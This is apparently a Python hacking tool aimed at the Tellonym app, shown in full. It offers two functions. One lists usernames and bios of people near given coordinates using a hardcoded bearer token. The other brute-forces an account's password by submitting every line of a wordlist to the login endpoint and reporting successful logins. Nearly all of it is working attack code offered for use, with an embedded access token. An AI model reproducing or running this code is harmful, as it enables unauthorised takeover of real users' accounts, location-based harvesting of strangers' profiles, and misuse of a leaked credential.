import requests
import json
from time import sleep
BBlack="\033[1;30m"       # Black
BRed="\033[1;31m"         # Red
BGreen="\033[1;32m"       # Green
BYellow="\033[1;33m"      # Yellow
BBlue="\033[1;34m"        # Blue
BPurple="\033[1;35m"      # Purple
BCyan="\033[1;36m"        # Cyan
BWhite="\033[1;37m"       # White
def fx1():
  s = input(BPurple+'[+] - Location : ')
  sk=s.split('(')[1]
  ss=sk.split(',')[0]
  s2=sk.split(',')[1]
  ss1=s2.split(')')[0]
  url = "https://api.tellonym.me/suggestions/people?latitude="+ss+"&longitude="+ss1+"&adExpId=94&limit=31"
  
  headers = {
  	"Host": "api.tellonym.me",
  	"Content-Type": "application/json",
  	"Accept": "application/json",
  	"Connection": "keep-alive",
  	"tellonym-client": "ios:2.65.0:488:14:iPhone13,3",
  	"User-Agent": "Tellonym/488 CFNetwork/1206 Darwin/20.1.0",
  	"Authorization": f"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ODU0MDYzOTQsImlhdCI6MTY1NTUwNTYzNH0.fA71oiqOBiUlKlEnNNWL3OTJ_jmLc9mOvf7lVzxZ91c",
  	"Accept-Language": "en",
  	} 
  	
  response = requests.get(url, headers=headers).text
  info = json.loads(response)
  
  for i in range(300):
    sleep(0.4)
    if 'peopleSuggestions' in response:
      try:
        print('\n'*4)
        print(BCyan+'='*9)
        print(BPurple+"username : ",str(info["peopleSuggestions"][i]["username"]))
        print(BPurple+"name : ",str(info["peopleSuggestions"][i]["aboutMe"]))
        print(BCyan+'='*9)
      except :
        exit()
def fx():
  email=input(BPurple+'[+] - user : ')
  pas=input(BPurple+'[+] - file password : ')
  print('\n'*3)
  bad=0
  good=0
  for i in range(1000000) :
    file = open(pas, "r")
    for password in file.readlines():
      print(f"\r       Good | {good} / Bad | {bad}",end="")
      url = "https://api.tellonym.me/tokens/create"
    
      headers = {
        "Host": "api.tellonym.me",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Connection": "keep-alive",
        "tellonym-client": "ios:2.65.0:488:14:iPhone13,3",
        "User-Agent": "Tellonym/488 CFNetwork/1206 Darwin/20.1.0",
        "Accept-Language": "en",
        } 
      data = {
        "activeExperimentId": 0,
        "password": password,
        "country": "US",
        "deviceName": "Soud’s iPhone",
        "deviceType": "ios",
        "lang": "en",
        "limit": 16,
        "email": email
        }
      
      req = requests.post(url,json=data,headers=headers)
      
      if "WRONG_CREDENTIALS" in req.text:
        bad=bad+1
    
    
      elif "PARAMETER_MISSING" in req.text:
        bad=bad+1
    
      elif "accessToken" in req.text:
        good=good+1
        print("Login Success")
print(BRed+"""
                                                                                                                                                   
                                                                                                              
                   :::!~!!!!!:.
               .xUHWH!! !!?M88WHX:.
             .X*#M@$!!  !X!M$$$$$$WWx:.
            !!!!!!?H! :!$!$$$$$$$$$$8X:
          !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
         :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
          ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
           !:~~~ .:!M"T#$$$$WX??#MRRMMM!
            ~?WuxiW*`   `"#$$$$8!!!!??!!!
           :X- M$$$$       `"T#$T~!8$WUXU~
           :%`  ~#$$$m:        ~!~ ?$$$$$$
         :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~                                                                                                                                                     
                                                                                                                                                      
                                                                                                                 
                                                    
  """+BCyan+"""
  
  
   1 ==> users in the Location          
   2 ==> guess password tellonym     
            
""")

c=int(input(BGreen+'[+] - Choose : '))
print('='*10)
if c == 1:
  fx1()
if c == 2 :
  fx()

